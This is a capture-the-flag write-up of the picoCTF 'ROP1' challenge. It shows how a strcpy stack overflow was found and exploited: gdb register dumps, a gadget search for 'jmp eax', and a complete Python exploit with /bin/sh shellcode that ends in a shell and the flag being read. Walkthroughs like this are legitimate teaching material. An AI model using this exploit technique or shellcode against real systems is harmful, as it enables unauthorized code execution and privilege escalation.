### Solved by superkojiman

ROP1 is a 100 point exploitation challenge. We're given the following C code for rop1 and are told that it's running on a machine with ASLR: 

```c
#include <stdlib.h>

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

void vuln(char *name){
    char buf[64];
    strcpy(buf, name);
}

int main(int argc, char **argv){
    be_nice_to_people();
    if(argc > 1)
        vuln(argv[1]);
    return 0;
}
```

From the code provided we can see that there's a buffer overflow in the vuln() function due to the strcpy() call. Using pattern_create.rb and pattern_offset.rb, we find that EIP is at offset 76:

```text
root@kali ~/pico-ctf/rop1
# ./rop1 `pattern_create.rb 100`
Segmentation fault (core dumped)

root@kali ~/pico-ctf/rop1
# gdb -q -c core -batch -n -ex 'p $eip'
[New LWP 6170]
Core was generated by `./rop1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3'.
Program terminated with signal 11, Segmentation fault.
#0  0x63413563 in ?? ()
$1 = (void (*)()) 0x63413563

root@kali ~/pico-ctf/rop1
# pattern_offset.rb 0x63413563
[*] Exact match at offset 76
```

Let's run the program within gdb and see what the state of the registers and the stack are at the time of the crash. I provided an input of 76 "A"s and 4 "B"s to overwrite EIP and set a breakpoint after the call to strcpy(); that is *vuln+24

```
gdb-peda$ pdisass vuln
Dump of assembler code for function vuln:
   0x08048e6d <+0>:     push   ebp
   0x08048e6e <+1>:     mov    ebp,esp
   0x08048e70 <+3>:     sub    esp,0x58
   0x08048e73 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048e76 <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048e7a <+13>:    lea    eax,[ebp-0x48]
   0x08048e7d <+16>:    mov    DWORD PTR [esp],eax
   0x08048e80 <+19>:    call   0x80481e0
   0x08048e85 <+24>:    leave
   0x08048e86 <+25>:    ret
End of assembler dump.
gdb-peda$ br *vuln+24
Breakpoint 1 at 0x8048e85
gdb-peda$ r `python -c 'print "A"*76 + "BBBB"'`
[----------------------------------registers-----------------------------------]

EAX: 0xbfaf98a0 ('A' <repeats 76 times>, "BBBB")
EBX: 0x80481a8 (<_init>:        push   ebx)
ECX: 0xbfafa5c0 --> 0x524f0042 ('B')
EDX: 0xbfaf98ef --> 0xafa50042
ESI: 0x0
EDI: 0x80eb00c --> 0x8067850 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
EBP: 0xbfaf98e8 ("AAAABBBB")
ESP: 0xbfaf9890 --> 0xbfaf98a0 ('A' <repeats 76 times>, "BBBB")
EIP: 0x8048e85 (<vuln+24>:      leave)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

   0x8048e7a <vuln+13>: lea    eax,[ebp-0x48]
   0x8048e7d <vuln+16>: mov    DWORD PTR [esp],eax
   0x8048e80 <vuln+19>: call   0x80481e0
=> 0x8048e85 <vuln+24>: leave
   0x8048e86 <vuln+25>: ret
   0x8048e87 <main>:    push   ebp
   0x8048e88 <main+1>:  mov    ebp,esp
   0x8048e8a <main+3>:  and    esp,0xfffffff0
[------------------------------------stack-------------------------------------]

0000| 0xbfaf9890 --> 0xbfaf98a0 ('A' <repeats 76 times>, "BBBB")
0004| 0xbfaf9894 --> 0xbfafa571 ('A' <repeats 76 times>, "BBBB")
0008| 0xbfaf9898 --> 0xbfaf99a0 --> 0xbfafa5c2 ("ORBIT_SOCKETDIR=/tmp/orbit-root
")
0012| 0xbfaf989c --> 0x3
0016| 0xbfaf98a0 ('A' <repeats 76 times>, "BBBB")
0020| 0xbfaf98a4 ('A' <repeats 72 times>, "BBBB")
0024| 0xbfaf98a8 ('A' <repeats 68 times>, "BBBB")
0028| 0xbfaf98ac ('A' <repeats 64 times>, "BBBB")
[------------------------------------------------------------------------------]

Legend: code, data, rodata, value

Breakpoint 1, 0x08048e85 in vuln ()
gdb-peda$
```

After the leave instruction is executed, EIP will be set to 0x424242. EAX points to our buffer of "A"s and since the binary doesn't have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this: 

```
root@kali ~/pico-ctf/rop1
# msfelfscan -j eax rop1
[rop1]
0x08048d86 call eax
0x08048df4 call eax
0x08048e3c call eax
0x08049691 call eax
.
.
.

0x080e142f jmp eax
0x080e336e push eax; ret
0x080e53b3 jmp eax
0x080e873b call eax
0x080ea02c push eax; retn 0x0805
0x080ed99c push eax; ret
.
.
.
```

Out of the list I picked 0x080e142f which is a JMP EAX. For shellcode, I picked one that would execute /bin/sh. The final exploit code:

```python
import struct

shellcode = (
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"+
"\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"+
"\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"+
"\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"+
"\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"
)

# eip offset 76
jmpeax = struct.pack("<I", 0x080e142f)  # jmp eax

print "\x90"*21 + shellcode + jmpeax
```

Finally, exploit the binary and read the flag:

```text
pico1139@shell:~/skj$ id
uid=11066(pico1139) gid=1017(picogroup) groups=1017(picogroup)
pico1139@shell:~/skj$ /home/rop1/rop1 `python ./sploit.py`
$ id
uid=11066(pico1139) gid=1004(rop1) groups=1017(picogroup)
$ cat /home/rop1/flag.txt
theres_no_need_to_guess
$ 
```

The flag is **theres_no_need_to_guess**
